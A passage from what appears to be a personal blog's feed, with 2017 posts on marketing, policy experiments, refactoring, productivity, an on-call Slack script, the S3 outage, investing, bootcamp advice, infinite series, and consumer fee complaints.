  <p class="caption">Supply and demand curves. Source: <a href="https://en.wikipedia.org/wiki/Supply_and_demand">Wikipedia</a></p>
</div>

<p>The ideal situation for a consumer is a company has a great product that’s a bit too expensive to product and thus to sell. By investing in a marketing campaign the company is able to share how awesome its product is which can increase the demand so much that the cost to manufacture the item drops. This in turns makes the price go down which in turn feeds into more demand. These are the types of products where marketing is valuable.</p>

<p>A negative example of marketing (at least to the consumer) is where a company runs a marketing campaign which increases awareness of interest but instead of using that to sell more for a lower price uses the result to increase the price and sell to the same or fewer amount of people. In this case, fewer consumers benefit and the company may not be that much better off given the marketing expense.</p>

<p>As consumers we want to get a good deal and being able to think through the impact of the marketing is a nice way of seeing whether we’re getting our money’s worth. If a product is heavily commoditized with a ton of competition then marketing is solely meant to drive awareness and we’re better of buying the generic or store brand. Similarly, if a product has a high marginal cost and isn’t likely to get cheaper to make at scale (imagine a consulting service) then all the marketing will do is increase the price. On the other hand, if it’s a niche product that you’ve never heard of that you discovered through a marketing campaign that it may, in fact, be worth it and you’re arguably getting a cheaper product because of the marketing effort.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Embrace experimentation</title>
   <link href="http://dangoldin.com/2017/03/22/embrace-experimentation/"/>
   <updated>2017-03-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/03/22/embrace-experimentation</id>
   <content:encoded><![CDATA[
<p>Rather than debating various approaches the best way to determine the ideal option is to run an experiment and look at the outcome. The tech industry has embraced this and is constantly running all sorts of A/B tests to optimize any and all metrics. Unfortunately, this approach hasn’t spread to the rest of society where decisions are based on abstract theories and perceptions. Imagine how much society could improve if we expanded experimentation into policies affecting our cities, states, and countries.</p>

<p>It’s not going to be easy since it’s not just pushing new code out but the value would be incredible. Changing the color on a button on a webpage may improve user conversions by a fraction of a percent but testing a traffic congestion policy can improve the lives of hundreds of thousands of people in a big city. Imagine running an experiment to see what sort of education or health policies work best - that could improve the lives of hundreds of millions of people and the sooner we start the better. Rather than getting defensive and worried about change we should be optimistic about the opportunity change can bring.</p>

<p>One way we can do this as a society is to introduce laws with an expiration date that have a higher bar for renewal. It may only take a simple majority to try an experiment but to extend or make it permanent may require 75% of the vote. The goal is to make it easy to run experiments but difficult to get them to stick around unless they’re clearly delivering value.</p>

<p>This is a big shift from the way society has been running but there are signs that this is starting to happen. <a href="https://www.theguardian.com/world/2017/jan/03/finland-trials-basic-income-for-unemployed">Finland is running a basic income trial</a> but it’s targeted. I’m more encouraged by the <a href="http://basicincome.org/news/2017/02/us-ebay-founders-firm-donate-nearly-0-5-million-basic-income-pilot/">basic income trial in Kenya</a> which will give the residents of 200 villages a monthly income that will span the next 12 years. We need to see this willingness to run long term experiments and while it’s significantly cheaper to do this in developing countries I’m hopeful that we’ll start seeing these trials everywhere.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Refactor driven development</title>
   <link href="http://dangoldin.com/2017/03/19/refactor-driven-development/"/>
   <updated>2017-03-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2017/03/19/refactor-driven-development</id>
   <content:encoded><![CDATA[
<p>There are a variety of software development methodologies and I’d like to throw another one into the fray - refactor driven development. Rather than focusing on tests or models or functions the focus should be on expressive and maintainable code. Imagine spending 80% of your development time on refactoring old code and laying a solid foundation for all future work. Then the remaining 20% of the time can be spent on writing new features and functionality that drive the product forward. Once this work is done it may lead to more refactoring work to get the code back into a pristine state.</p>

<p>The intuition behind this is that a 10x developer is not just writing 10 times more code but is making decisions and designs that allow future changes to be done 10 times quicker. This only comes from building a system that can be easily extended and morph into something else. A few years ago I read <a href="https://www.amazon.com/Where-Good-Ideas-Come-Innovation/dp/1594485380">Where Good Ideas Come From</a> which introduced me to the concept of “<a href="http://www.practicallyefficient.com/2010/09/28/the-adjacent-possible.html">the adjacent possible</a>” which is this concept that we may not always see two steps ahead but once we take a step in a direction we’re able to see a whole new set of options. This translates beautifully into good code - we may not always see the benefits but once it’s written we suddenly see all this potential. Great code has a high degree of optionality which allows it to easily mutate to support a whole new world.</p>

<p>This emphasis on refactoring is risky since you may very well end up with something that’s too rigid and doesn’t provide any of the expected functionality. To make it work the team needs to have enough knowledge about the business to understand how the product will need to evolve as well as a strong understanding of design patterns and tradeoffs between various implementations. It’s not for the faint of heart and requires a team committed to improving the code quality and having the confidence and ability to hustle when an urgent business need arises.</p>

<p>The value of this approach is that business requirements and features can be done in hours or days instead of weeks. That’s incredibly powerful since so much of the time we are writing code with the goal to deliver something by a target date. Yet oftentimes we reach that date and discover that only a small bit of the whole is being used or even worse the code we wrote only handles a fraction of the desired use cases. Both of these indicate wasted development effort and while the agile process is meant to address this by having frequent iterations that are each meant to deliver value and raise potential problems earlier. At the same time the agile approach encourages us to think more tactically which prevents us from constantly thinking about the big picture and what can be done to increase our long term optionality.</p>

<p>Imagine being able to wait till the last minute before knocking a feature out. This gives you the luxury of waiting until you know something is a necessity rather than building something due to risk aversion. It’s definitely not easy and carries a world of risk but if you have a strong foundation and confidence that you can get it to work this ability is priceless.</p>

<p>This is of course a simplification of how development works and the reality is not as black and white. At the same time, I believe as an industry we do gloss over the business value a well maintained and clean code base provides. It’s difficult to prove and make the case that spending the majority of your time refactoring is actually going to be more valuable to the business  but in many cases this is true.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In praise of long running code</title>
   <link href="http://dangoldin.com/2017/03/12/in-praise-of-long-running-code/"/>
   <updated>2017-03-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/03/12/in-praise-of-long-running-code</id>
   <content:encoded><![CDATA[
<p>There’s something spectacular in checking in on a project you worked on years ago and discovering it’s still running years later. This past Friday I got an HTTPS alert from <a href="https://letsencrypt.org/">Let’s Encrypt</a> reminding me that my SSL certificate for <a href="https://yahnr.dangoldin.com/">https://yahnr.dangoldin.com</a> was set to expire. I checked it out and remarkably it’s still up and running. I built that in March of 2013 as a proof of concept of what I termed a <a href="http://dangoldin.com/2013/03/12/mmmm-pseudo-static-sites/">“pseudo-static site.”</a> The idea was to have a site hosted on statically on S3 but powered by a dynamic job that refreshes the underlying data.</p>

<p>It’s incredible that the code is still functioning as expected. Based on the <a href="https://github.com/dangoldin/yahnr/commits/master">commit history</a> I did make minor tweaks in 2014 and 2015 but they didn’t alter any of the core functionality. What’s more impressive is that this was based on scraping Hacker News which implies that Hacker News itself didn’t go through a significant enough redesign that broke the page parsing. It does look as if the comment count isn’t being properly fetched but other than that everything looks perfect.</p>

<p>Four human years isn’t very long but in internet years it’s ancient. The fact that some throwaway code is still running four years later is a pleasant surprise and highlights the resiliency of a good design. No matter what code we’re writing it’s valuable to think about how it will stand the test of time and whether there’s a way of improving the resiliency - not for the project itself but to get into the habit of writing robust and durable code.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Stop procrastinating</title>
   <link href="http://dangoldin.com/2017/03/09/stop-procrastinating/"/>
   <updated>2017-03-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/03/09/stop-procrastinating</id>
   <content:encoded><![CDATA[
<p>I often find myself wanting to postpone something but after forcing myself to actually do it I discover that most of the difficulty was getting over the postponement hump. Especially these days it’s very easy to get distracted - whether it’s checking your email, responding to a few tweets, or clearing notifications on Slack - but it’s important to just focus on the most important task at hand. After starting you discover that the task wasn’t worth delaying and get an energy boost from actually finishing something.</p>

<p>There are a ton of tricks and tools to discourage procrastination and I wanted to share some of my favorites. At the end of the day if you’re not serious about doing the work they won’t help but they do help in turning a healthy process into a valuable habit.</p>

<ul>
  <li><strong>Plan tomorrow out today</strong>: It’s easy to go home at the end of the day and then spend the following morning figuring out what you should work on. Instead take the time at the end of today to figure out your priorities for tomorrow. This allows you to get a jump start on the next day since you don’t have to spend the effort figuring out what you should be doing.</li>
  <li><strong>Do the difficult stuff first</strong>: Difficult tasks take time and energy and you’re better off doing it when you’re at your peak. For me it’s in the morning when I’m distraction free and I try to get as much done during that time as I can. Similarly, if you have a project with a ton of components you want to derisk it by working through the riskiest pieces first rather than delaying the uncertainty and ending up with an unpleasant surprise.</li>
  <li><strong>Schedule your tasks</strong>: Many people use a todo list but I find a much stronger form of this to be actually putting down tasks as calendar events. This forces you to dedicate time to the task and you have no excuses for not working on what you committed to doing. Of course your estimates will be wrong but all that means is you dedicate some future time to finishing it up. A side benefit of this is that you end up becoming much better at estimated how long various tasks will take.</li>
  <li><strong>Avoid distractions</strong>: This is an obvious one and arguably should not even be on this list but the more distractions there are the more distracted you will be. Extreme versions of this are to close every program you’re not using and even install apps that won’t let you do anything but the task at hand. Instead of resorting to those it’s more important to train your mind to focus.</li>
  <li><strong>Try the <a href="https://en.wikipedia.org/wiki/Pomodoro_Technique">Pomodoro technique</a></strong>: I used this in the past with moderate success but the idea is to break your day into chunks: 25 minutes to work on a task, followed by a 5 minute break, repeated until you’ve done this 4 times and earned yourself a longer break. I’ve found it a bit too structured for me since when I get in the zone I want to remain in the zone instead of having to think about the next break. Many people swear by it though.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Automating admin work: Spreadsheets to Slack</title>
   <link href="http://dangoldin.com/2017/03/04/automating-admin-work-spreadsheets-to-slack/"/>
   <updated>2017-03-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/03/04/automating-admin-work-spreadsheets-to-slack</id>
   <content:encoded><![CDATA[
<p>Recently we adopted the concept of owning your own up time for our engineering teams. The goal is to encourage a stronger sense of ownership and actually give the teams the autonomy to approach their development and release process the way they’re comfortable with. Before this we relied on a single on call every week that would be responsible for monitoring all issues and escalating them to the appropriate team. One minor side effect of this change was that I now had to manage the on call calendar and post the new rotation on Slack every week. Since this was a good opportunity to mess around with the Google Spreadsheet and Slack APIs I decided it good be a fun little project.</p>

<p>The spreadsheet has a set of columns with a header - the important ones being a “Current” column indicating whether this is the current week and driven by a spreadsheet formula and a set of columns indicating the on call for that particular team. All the script needs to do is find the “current” row and generate a Slack message highlighting the on call engineer for each team.</p>

<p>Turns out the code was ridiculously easy to write. The <a href="https://github.com/burnash/gspread">gspread</a> Python library provides a very simple way of reading a Google Spreadsheet and all I need from Slack is a way to pull the list of users (which I could have just kept in the Spreadsheet) and post a message. The code is <a href="https://github.com/dangoldin/gsheet-slack">up on GitHub</a> and I hope to expand it to handle more of the standard admin work given how easy it was to get this working.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lessons learned from today's S3 failure</title>
   <link href="http://dangoldin.com/2017/02/28/lessons-learned-from-todays-s3-failure/"/>
   <updated>2017-02-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/28/lessons-learned-from-todays-s3-failure</id>
   <content:encoded><![CDATA[
<p>Today was quite a day. S3, the most resilient of Amazon’s services went down for a few hours in the US-EAST-1 zone and led to a series of failures across a variety of services. There are a ton of lessons one should take away from this - ranging from running across multiple availability zones to being integrated with a variety of cloud providers. The challenge is that it’s not easy; especially when you’re small. At that point you have to prioritize building support for a 0.01% chance of massive failure versus a variety of features and product enhancements to drive your business forward.</p>

<p>As always, there is no black and white answer and your approach should depend on your situation. If you’re working in healthtech or finance and need resilience you should focus on resiliency. If you’re just building a proof of concept consumer app you should focus on building a useful product and not worry about dealing with zone failures. Of course there are best practices you can adopt to make your application more resilient (containerization, statelessness, etc) but they shouldn’t be the primary focus.</p>

<p>Yet this experience provided me with two major realizations: the importance of aggressive edge caching and the value of a loosely coupled system. An aggressive edge caching strategy won’t solve all your problems but the more data that’s cached in your user’s browsers or on a CDN the easier your system can handle internal failure. In the case of an S3 failure this meant that our CDN would be able to serve the last available assets rather than having browser make requests to failing endpoints. A loosely coupled systems buys you time which lets the kinks get worked out in the underlying system. In our case this manifested in our ability to keep collecting event data in Kafka despite our inability to persist to S3. Since Kafka is designed to be a rolling window of events we were able to just consume the events from the last uploaded time as soon as S3 came back up. The outage even gave us the opportunity to tweak some of our configs (from the wonderful <a href="https://github.com/pinterest/secor">Secor</a> library) to prove that we could persist our event data to Google Cloud Storage if we needed to.</p>

<p>All in all, it was not the most pleasant of days but it did offer a variety of lessons that do contribute to making our systems significantly more reliable and resilient. Not all of us have the ability to test using a <a href="https://github.com/Netflix/SimianArmy">Simian Army</a> so for the rest of us we get to learn through production failures.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My Snapchat investment strategy</title>
   <link href="http://dangoldin.com/2017/02/26/my-snapchat-investment-strategy/"/>
   <updated>2017-02-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/26/my-snapchat-investment-strategy</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/fb-stock-chart.png" alt="Facebook stock chart" width="897" height="230" layout="responsive"/>
  <p class="caption">Facebook stock price since IPO</p>
</div>

<p>Snapchat is expected to IPO <a href="http://fortune.com/2017/02/17/snapchat-ipo-what-time-when-stock/">March 2nd</a> and I’m torn as to whether to invest. I think it’s an innovative product that provides a compelling experience but there’s a series of red flags - from the weird ownership structure to the potential slowdown in user growth to the growing per user costs. At the same time it may be the next social network. Facebook IPOed at just over $100B and is now worth almost $400B. I hate to compare Snapchat to Facebook but the bull case is that it can be the next Facebook. There’s been a history of startups growing to surpass the prior generation of companies and outside of Snapchat there’s nothing in the social media space. Snapchat has its work cut out but they do offer a unique product with a strong user experience that’s constantly improving.</p>

<p>So what should one do in this case? On one hand the product seems great with a ton of potential but on the other there are quite a few questions. My gut is that Snapchat is unlikely to be stuck in the middle - it will either be a massive success or a flop. If this is the case it’s not necessary to get in at the very beginning and I can see how it goes for a few quarters before deciding to invest. I’m cautiously optimistic that they can figure out their costs but worry that their growth stalled due to Facebook’s push of stories in Instagram and WhatsApp. From the S1 it’s impossible to know if there was an impact but after a few quarters it should be clear what’s happening. If at that point it looks as if they’ve taken care of their growth and cost problems it will be an obvious investment but at the IPO I’ll likely invest a token amount just to have a stake.</p>

<p>It took Facebook over a year to get back to their IPO price but since then they’ve nearly quadrupled. There’s no need to jump into Snapchat at the first possible moment. Instead it’s better to wait a few quarters and see how it evolves before making a significant investment decision.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Advice for coding bootcamp graduates</title>
   <link href="http://dangoldin.com/2017/02/21/advice-for-coding-bootcamp-graduates/"/>
   <updated>2017-02-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/21/advice-for-coding-bootcamp-graduates</id>
   <content:encoded><![CDATA[
<p>Coding bootcamps are increasingly popular and I’ve seen a large number of resumes come across my desk so wanted to share my perspective and offer some advice. I think it’s great that more people are learning to code. At the same time there’s a lot of volume and based on a few months it’s difficult to stand out, especially as more and more bootcamps spring up. First off, I respect the hell out of people taking the leap. It takes a lot of effort to stop what you were doing and pursue a completely different career track. It’s not easy and already sends a signal that you’re motivated and willing to grow your skills. Below are a few other ways to help improve your odds of getting hired. Most of these are relevant even if you’re not coming from a bootcamp so read on if interested.</p>

<ul>
  <li><strong>Leverage your prior experience</strong>. Everyone comes into a bootcamp with their own set of experiences and a good way to stand out from the crowd is to leverage that experience in a future role. Many companies would be willing to take on someone less experienced in coding if they make up for it with business and industry context. If your worked as an architect why apply to every other startup? Instead apply to software companies serving the architecture field or potentially technical roles at an architecture firm. No matter what your prior experience was there should be a company that would benefit from that prior knowledge and coding experience.</li>
  <li><strong>Do a personal project outside of the bootcamp</strong>. Bootcamp projects require you to do projects and are typically done with teams so it’s tough to know how much of that was done by you versus others. In addition, mentors helped so the projects aren’t an accurate barometer of your skill. A way to combat that is to do a project entirely on your own outside of the bootcamp and explicitly call it out on your resume. Bonus points for having it on GitHub with an ongoing stream of commits and even more bonus points for having it up and running at a live link.</li>
  <li><strong>Commit to open source</strong>. Another way to make up for the group project is to commit to an open source project. It shows that you’re familiar with version control tools and can code well enough to have your code accepted into an open source project. More importantly, it shows you’re serious about improving as a developer.</li>
  <li><strong>Understand your application funnel</strong>. A typical application flow is you see a job listing, submit your resume, have a quick phone screen, do a take home exercise, and then visit the office for an in-person interview. Knowing this you should understand your stats at different points in the funnel. Are you not getting to the phone screen? Work on your resume. Are you not getting invited for the in person? Focus more on your code test. By knowing these numbers you can concentrate on your weakest areas.</li>
  <li><strong>Ask for feedback</strong>. A simple and easy way to improve is to ask for feedback. Most of the time you won’t get anything but when you do it’s well worth it given it’s such little effort. Showing humility and a desire to improve can work wonders. Most people understand where you’re coming from and want to help.</li>
  <li><strong>Revisit prior interview questions and exercises</strong>. The job hunting process can be exhausting but the benefit is that you get to go through the gauntlet and collect a ton of questions and coding exercises. A good way to gauge how much you’re growing is to go over some of the prior questions and exercises and take another shot at them. If you end up repeating a take home code test and have the same implementation as you did a month ago it indicates you haven’t improved enough and need to rethink your approach. On the other hand, a cleaner and more expressive attempt is an indicator that you’re improving.</li>
</ul>

<p>I hope these tips helped but the general idea is that having a bootcamp on its own is not enough. You need to be thinking of ways to differentiate yourself while constantly improving your skill and craft.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Math is incredible</title>
   <link href="http://dangoldin.com/2017/02/19/math-is-incredible/"/>
   <updated>2017-02-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/19/math-is-incredible</id>
   <content:encoded><![CDATA[
<p>Maybe I never learned this or maybe I forgot but while reading <a href="https://www.amazon.com/Prime-Obsession-Bernhard-Greatest-Mathematics/dp/0452285259">Prime Obsession</a> I came across a concept that blew my mind. We all learn about infinite series and how some converge (think 1 + ½ + ¼ + .. = 2) and some diverge (1 + ½ + ⅓ + ¼ + ..) but it turns out that not all convergent series are the same. The same numbers, added in a different order, can lead to a different resulting sum. These series are called <a href="http://mathworld.wolfram.com/ConditionalConvergence.html">conditionally convergent</a>. This is incredible since I always assumed that addition was commutative but it turns out even fundamental ideas are violated when dealing with infinite sums. I still can’t wrap my mind around how this makes any sense but the math doesn’t lie. The example below is from the book but I’d love to see others so I can continue wrapping my head around it. I’ve been out of school for a while now but this discovery brings me back.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/conditional-convergence-1.png" width="214" height="51" layout="responsive"/>
      <p>The alternating harmonic series.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/conditional-convergence-2.png" width="284" height="57" layout="responsive"/>
      <p>Move the terms around so we have the 1/n and 1/(2n) terms next to one another, but keep those where n is a multiple of 4 alone.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/conditional-convergence-3.png" width="312" height="59" layout="responsive"/>
      <p>Group these 1/n and 1/(2n) pairs together.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/conditional-convergence-4.png" width="200" height="57" layout="responsive"/>
      <p>Simplify these 1/n and 1/(2n) pairs.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/conditional-convergence-5.png" width="197" height="61" layout="responsive"/>
      <p>Factor out 1/2 from the series and we have 1/2 of the original series. The sum of the alternating harmonic series is ln(2) but by changing the order around we can have it equal to ln(2)/2. That's amazing.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Read books, not blog posts</title>
   <link href="http://dangoldin.com/2017/02/16/read-books-not-blog-posts/"/>
   <updated>2017-02-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/16/read-books-not-blog-posts</id>
   <content:encoded><![CDATA[
<p>Right now I have three tabs open for books I plan on reading: <a href="http://dataintensive.net/">Designing Data-Intensive Applications</a>, Google’s <a href="https://landing.google.com/sre/book.html">Site Reliability Engineering</a>, and <a href="http://www.deeplearningbook.org/">Deep Learning</a>. Unfortunately these tabs have been open for over a week and yet I haven’t deeply committed to any one of them. Yet during this time I spent a bunch of time reading a variety of blog posts and articles that provide bite size information. This is terrible. I could have instead spent the same amount of time actually diving deeper and gaining a much better understanding of a new topic but instead I distracted myself and resorted to the easy reward.</p>

<p>I suspect many people fall into this trap. It feels as if we’re learning and given the massive amount of information that’s constantly being produced there’s always something to read. Most of the posts we read go in one ear and out the other but committing and reading a book makes the content much more sticky and valuable. As a child I was able to read books for hours at a time but now find myself constantly distracted - whether that’s looking at my phone for notifications, checking my email, or catching up on Twitter - but as an adult I’m less focused than a child. This needs to be fixed and I’m making a concerted effort to focus my time on books rather than blog posts and am going to push others to do the same. I also realize the hypocrisy in me preaching to read books in a short blog post but it is what it is.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mancur Olson and the changing economy</title>
   <link href="http://dangoldin.com/2017/02/13/mancur-olson-and-the-changing-economy/"/>
   <updated>2017-02-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/13/mancur-olson-and-the-changing-economy</id>
   <content:encoded><![CDATA[
<p>I studied economics in college but only encountered Mancur Olson years later when I picked up “<a href="https://www.amazon.com/Rise-Decline-Nations-Stagflation-Rigidities/dp/0300030797">The Rise and Decline of Nations</a>” at a bookstore years later. It proposes a simple theory that explains why some countries succeed while others fail - as a country maintains growth and stability it ends up developing more and entrenched interests that hobble future growth. Olson uses a variety of historical economic examples to prove this point - ranging from the British empire to Germany and Japan post World War II - that make a compelling case. This also ties in nicely with the sharing economy since it ties into the idea of regulatory capture - where government agencies are lobbied by special interest groups to introduce laws that defend their market position. This is currently playing out with the sharing economy - the taxi and limo lobbies are fighting Uber while hotels are challenging AirBnB. Both Uber and to a slightly lesser degree bring significant value to society but spend money on lawyers and lobbyists that could be spent on pushing the economy and world forward.</p>

<p>Another simple but only obvious after you hear it point is that small groups are able to achieve significantly more than large groups. Since the value to an individual in a small group is significant that one person would be willing to fight and invest to make something happen. The cost, on the other hand, is distributed across an order of magnitude more people so each person has very little incentive to challenge it. I haven’t read the book in a while but I think the example he uses is of the farming lobby. Farmers have a very strong incentive to pressure the government for farm subsidies and are willing to vast both time and money to make sure their representatives push for it. To them the value of this legislation may be thousands of dollars and they’re willing to spend nearly that much to see it through. Everyone else is hurt by this but to them the cost is pennies - this leads to the effect that small groups are able to drive more change than larger ones.</p>

<p>With the economy undergoing significant changes in the coming years it’s critical to understand what’s happening and Mancur Olson provides a wonderful set of theories to help understand the change.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Traffic efficiency</title>
   <link href="http://dangoldin.com/2017/02/09/traffic-efficiency/"/>
   <updated>2017-02-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/09/traffic-efficiency</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/traffic-efficiency.png" width="389" height="367" alt="traffic efficiency"/>
</div>

<p>While using Google Maps to pull some directions I stumbled unto a case where every single option gave the same time estimate. I like harboring the idea enough people use Google Maps that they’re able to optimize each route to reduce the total time across the entire system. By having enough data from the tens of thousands of drivers on these roads Google can predict how busy the roads will be due to the directions they’re providing. In turn, they’re able to use this information to predict what the traffic patterns will look like on those roads in the future and use that knowledge now to change it.</p>

<p>I doubt it’s that sophisticated but such approaches will becoming dominant when self driving cars take over. Similar to how modern skyscraper elevators ask for your desired floor and tell you which elevator to go to to reduce your total time once there’s enough scale we’ll be able to have our self-driving cars do the same.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>New law? Let the opposition name it</title>
   <link href="http://dangoldin.com/2017/02/06/new-law-let-the-opposition-name-it/"/>
   <updated>2017-02-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/06/new-law-let-the-opposition-name-it</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
    <img src="http://dangoldin.com/assets/static/images/bills-passed-by-congress.jpeg" width="1024" height="768" layout="responsive"/>
    <p class="caption"><a href="https://www.washingtonpost.com/news/the-fix/wp/2014/04/10/president-obama-said-the-113th-congress-is-the-least-productive-ever-is-he-right/">The Washington Post</a></p>
</div>

<p>Whenever a new law is passed it’s incredibly difficult to have it repealed since there are enough people benefiting who will fight against the removal. This leads to a situation where instead of replacing old laws with new laws we end up with a massive system of laws with new ones that just get thrown on. This leads to a whole slew of inefficiencies and requires experts to help navigate the landscape who themselves benefit from the complexity and want to maintain it as much as they can.</p>

<p>It’s true that there have been fewer laws passed over the past decade likely due to the polarized congress but I would rather see many old and archaic laws repealed in favor of modern ones that are built for the current and future world.</p>

<p>So what can we do about it? An idea I’ve been toying with is to give the opposing voters the ability to name it. The idea is that the law will be active but it will be so terribly named that it will be much easier to repeal in the future. I’m only partially joking and suspect there may be something here. Imagine the type of public support we’d see to repeal awfully named laws.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Identifying product weaknesses using Google autocomplete</title>
   <link href="http://dangoldin.com/2017/02/04/identifying-product-weaknesses-using-google-autocomplete/"/>
   <updated>2017-02-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/04/identifying-product-weaknesses-using-google-autocomplete</id>
   <content:encoded><![CDATA[
<p>A simple trick I’ve started using when learning about new tools or technologies is to just type in “{name} vs” in Google search and see what pops up. This relies on the wisdom of the crowds and Google’s prediction to give me insight into other items in the same space. Oftentimes going to the corporate site gives me standard marketing copy but looking at comparisons provides the actual details: What do people use it for? What are the competitors? How does it compare against them? What are some success stories? What are some failure cases?</p>

<p>Looking at just the site and reading a few white papers only gives you the positive elements. What’s more important is the knowledge of what the tool or technology doesn’t do. This allows me to actually think about the vision for what I’m building and use that knowledge to anticipate the potential issues. Then by seeing what problems others have had I can determine whether they may be relevant to my problem. Otherwise I may end up building something only to realize that my entire foundation was flawed and needs to be rebuilt.</p>

<p>Of course this isn’t a panacea and it’s impossible to get everything from a Google search but it’s quick and easy enough to not need a second thought. You might not discover anything new but if you do it would have been well worth it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Learning modern frontend development</title>
   <link href="http://dangoldin.com/2017/02/01/learning-modern-frontend-development/"/>
   <updated>2017-02-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/02/01/learning-modern-frontend-development</id>
   <content:encoded><![CDATA[
<p>Until a few weeks ago my frontend programming experience ended with jQuery so I decided to do something about it and start getting up to speed with modern frontend development. This ranged from starting to mess around with React, to using ES6, to integrating webpack and Babel in these projects. I’ve been using Sublime Text for the past 6 years but am switching to <a href="https://code.visualstudio.com/">Visual Code Studio</a> as my primary editor.</p>

<p>So far I have two projects in different stages of completion. The first is a turning my “<a href="https://dangoldin.github.io/js-tools/">JavaScript Tools</a>” page into a standalone app using React and <a href="http://electron.atom.io/">Electron</a>. The idea here is that I have a set of tools that live online but I have a soft spot for desktop apps and want one of my own that I can just keep open and quickly switch to whenever I need to get anything done. Over time I see this evolving with tools that I end up using on a frequent basis as well as shortcuts to make them fit for a “power user.”</p>

<p>The other project was inspired by the <a href="https://twitter.com/slpng_giants">Sleeping Giants twitter account</a> which calls out major brands for advertiser on hate-based sites. It’s still a work in progress but the intent is to automate the capture of the ad on the site and the identification of the advertiser’s twitter account. The next step is to broadcast this information back on Twitter - either automatically or surfacing the content so people can do it themselves.</p>

<p>If you’re interested in helping out or just want to follow along both projects are on GitHub: <a href="https://github.com/dangoldin/dan-tools">https://github.com/dangoldin/dan-tools</a> and <a href="https://github.com/dangoldin/ad-detection">https://github.com/dangoldin/ad-detection</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The freedom to move</title>
   <link href="http://dangoldin.com/2017/01/28/the-freedom-to-move/"/>
   <updated>2017-01-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/28/the-freedom-to-move</id>
   <content:encoded><![CDATA[
<p>I’ve had this thought for a while now but Trump’s latest executive order banning Muslim immigration is forcing me to put it in writing. The freedom to move should be a human right and can act as the foundation of all others. If you don’t like the policies of your city? Move to another one. Your state? Move to another one. Your country? Same thing.</p>

<p>By giving people the freedom to choose where they live policies will arise that benefit the greatest number of people. If you’re keen on having a strong religious state you should be able to move there. If you want to live in a big city you should be able to move to one. If it turns out that a particular location is losing residents it will act as a signal that they need to do something. Over time the best policies will rise to the top and the world will have an rapid pace of policy innovation.</p>

<p>Of course it’s not realistic since we all have family, friends, and jobs and aren’t able to get up and move whenever something bothers us. Beyond that the value in the world’s wealth is not equally distributed which would leave to some immediate shifts. One can argue that that’s good for the long term since it will smooth out the wealth distribution but it will be dangerously destructive. Cultures are also significantly different across the world and beyond the conflict we’ll have when some collide it’s a risk that the world’s cultures will blend into one and we’ll lose our uniqueness.</p>

<p>This won’t happen any time soon but to have a fair world we must allow individuals to choose to live wherever they want. Most won’t take the offer since there’s always going to be something keeping them around but having the ability to move anywhere is powerful and liberating.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Shame on United and Bank of America</title>
   <link href="http://dangoldin.com/2017/01/26/shame-on-united-and-bank-of-america/"/>
   <updated>2017-01-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/26/shame-on-united-and-bank-of-america</id>
   <content:encoded><![CDATA[
<p>Over the past month I had two experiences that seem too coincidental to be true and highlight how desperate some companies are to chase every penny.  These are massive corporations that seem intent on sneaking in false fees and charges hoping that their customers don’t notice.</p>

<p>The first involved United Airlines. The airline industry already suffers from poor reputation and it seems United is doubling down on it. I had a flight back from a vacation and thought I’d treat ourselves to an upgrade. United had an option to use miles and money which would charge you immediately, add you to the upgrade list, and refund both if you weren’t picked. We didn’t get the upgrade but we miraculously received a refund of the miles but only half of the money. It took a few phone calls but in the end I got the refund.</p>

<p>The second was a much smaller amount but just as frustrating. I requested a new debit card from Bank of America and got a wonderful notice telling me it was free of charge, this time. Lo and behold I check my statement in a week and see a debit for a “card replacement fee.” Sure enough a phone called took care of this as well.</p>

